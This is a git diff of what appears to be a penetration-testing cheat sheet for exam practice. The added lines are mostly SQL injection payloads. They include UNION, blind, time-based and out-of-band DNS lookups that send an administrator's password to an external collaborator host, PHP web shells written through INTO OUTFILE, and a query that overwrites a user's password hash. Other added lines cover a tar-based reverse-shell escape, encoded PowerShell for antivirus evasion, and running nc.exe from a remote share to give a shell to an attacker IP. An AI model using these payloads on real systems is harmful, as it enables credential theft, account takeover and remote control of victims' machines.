@@ -1887,6 +1887,7 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 **Tools**
 - [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
+- [SQL Injection cheat sheets | ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
 - [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
 - [Ghauri](https://github.com/r0oth3x49/ghauri)
 
@@ -1908,32 +1909,79 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 
 #### <ins>Identification</ins>
 
-**How to identify SQL injections**
-- Search for SQL errors, use the apex or the backtick character in parameters and analyze the response.
+**Error based**
+- `' OR '1'='1`
+- `' OR '1'='1' --`
+- `' OR 1=1 #'`
+- `' UNION SELECT NULL,NULL,NULL--`
+  - add / remove NULLs to make the query work
+  - on Oracle, they work differently. See PortSwigger
+- `Accessories' UNION SELECT table_name, NULL FROM all_tables--`
+- `Accessories' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BIZMOI'--`
+- `Accessories' UNION SELECT PASSWORD_ZRFHII, USERNAME_SCSVZM FROM USERS_BIZMOI--`
+- `' UNION SELECT NULL,username||'~'||password FROM users--`
+- `1 UNION SELECT username||':'||password FROM users--`
 
-**Error-based payloads**
-- Try to generate an error using characters like `'` or the backtick
-- Try this payload `' OR 1=1 -- //`
+**Blind**
+- First char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`
+- Second char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'm`
+- Third char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'm`
+- etc.
+- Note: it can be automated with Intruder Cluster bomb
 
-**UNION-based payloads**
-- `' ORDER BY <NUMBER>-- //` Verify the exact number of columns
-  - increment the `<NUMBER>` value from `1` to `..` until you reach an error like `Unknown column '7' in 'table'`
-  - [check this](https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required-in-a-sql-injection-union-attack)
-- `' UNION SELECT database(), user(), @@version, null, null -- //` enumerate the database via SQL UNION Injection
-  - use `null` to have the correct number of columns
+**Blind - error based**
+- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+  - Test length of a password
+- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-**Blind SQL injections detection**
-- ```SQL
-  0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
-  ```
-- ```SQL
-  0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
-  ```
-- ```SQL
-  0'or(now()=sysdate()&&SLEEP(1))or'Z
-  ```
+**Blind - verbose SQL errors**
+- `CAST((SELECT example_column FROM example_table) AS int)`
+- `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
+- `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
+- `Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+**Blind - time based**
+- `'; IF (1=1) WAITFOR DELAY '0:0:10';--`
+- `'; IF (1=2) WAITFOR DELAY '0:0:10';--`
+- `'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--`
+  - testing the existence of the table users
+- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--`
+  - testing the existence of the column username
+- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--`
+  - testing the presence of another column, in this case, searching if it starts with pass. Using % you can test letter by letter
+- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10';--`
+  - see how may columns there are in the db
+- `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'butch' AND password_hash='8' WAITFOR DELAY '0:0:5'--`
+  - discover password_hash
+- `'; update users set password_hash = 'tacos123' where username = 'butch';--`
+  - try update an user creds
+  - verify the success of it with the query `'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--`
+  - for the hash, try various combination (md5sum, sha1sum, sha256sum): `echo -n 'tacos123' | md5sum`
+    - `'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--`
+- See exploit https://www.exploit-db.com/exploits/47013
+
+**Blind - delay with conditions**
+- `x'%3b SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+- `x'%3b SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
+- `x'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
+  - to automate this: Resource pool > New resource pool with Max Concurrent requests = 1
+
+**DNS lookup**
+- `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wggnzi1futt3lvlzdsfuiwfdg4mvapye.oastify.com/"> %remote;]>'),'/l') FROM dual--`
+- `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.chx30y2vv9ujmbmfe8gajcgthknbb6zv.oastify.com/"> %remote;]>'),'/l') FROM dual--`
+- `' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--`
+  - Useful with `sudo responder -I tun0` to take hashes from Windows OS
+
+**HTML Encoding**
+- `&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;`
+- https://mothereff.in/html-entities
   
 #### <ins>Notes</ins>
+
+- If you find path / slug you might find an SQLi
+- `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
+- `SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"`
+- `%27%20union%20select%20%27%3C?php%20echo%20system($_REQUEST[%22bingo%22]);%20?%3E%27%20into%20outfile%20%27/srv/http/cmd.php%27%20--%20-`
 
 **Extract database information**
 - Extract the version: `?id=1 union all select 1, 2, @@version`
@@ -4463,11 +4511,12 @@ Run:
 
 #### <ins>Escape shell</ins>
 
-- with tar https://gtfobins.github.io/gtfobins/tar/#shell
+- [With tar](https://gtfobins.github.io/gtfobins/tar/#shell)
   1. create an sh with a nc command for a reverse shell > name 'exploit.sh'
-  2. touch ./"--checkpoint=1"
-  3. touch ./"--checkpoint-action=exec=bash exploit.sh"
+  2. `touch ./"--checkpoint=1"`
+  3. `touch ./"--checkpoint-action=exec=bash exploit.sh"`
 - https://vk9-sec.com/linux-restricted-shell-bypass/
+- https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
 
 #### <ins>Docker</ins>
 
@@ -5335,6 +5384,10 @@ On Immunity, using mona, type
 
 
 ## Antivirus Evasion
+
+- With powershell, use `-e` or `-enc` with an encoded command in base64
+- See more here: [Section 14: Antivirus Bypassing](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-14-antivirus-bypassing)
+- Try not running exe on disk, for example `cmd /c \\192.168.45.182\Share\nc.exe -i cmd.exe 192.168.45.182 448`
 
 ### <ins>ToDo</ins>
 - Discover the AV in the machine of the victim
